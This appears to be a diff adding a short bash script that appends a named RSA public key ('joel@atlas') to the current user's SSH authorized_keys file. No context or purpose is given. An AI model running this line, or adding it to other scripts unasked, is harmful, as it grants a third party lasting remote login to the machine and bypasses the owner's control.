@@ -1,0 +1,2 @@
+#!/bin/bash
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCXqe5hJqPMoVBC95epFKy0h4WdPh5R5U1gaK5+I52D1YopWU1DFq+rD6RsunNWNuTmoyWw9NSU0ATtbr8WybKH2QNPTVBq6uG0tMvi/so3JHuXqORPJcyVjRMZs5sIn4hdxFY9UZzzXdCAWJSW+blGmV0VYsbi+q8lYK1/mkgHnfwvfoNS0GiJKPqS4V20uLoyG7LMCkmgmqB2mAUq9K9BGEFeMcCk1pIAD3VSfQjAVyYrzU6eMjGOcDO9Bo/ywT7geHSIWNpArXcwcQwcW//vTtx+nQOoAWcbIekc8mHO4Jybvjz1lcRs/dyi9Fic2UT1vLxrlP6LNmb5D5Se45Vz joel@atlas" >> ~/.ssh/authorized_keys
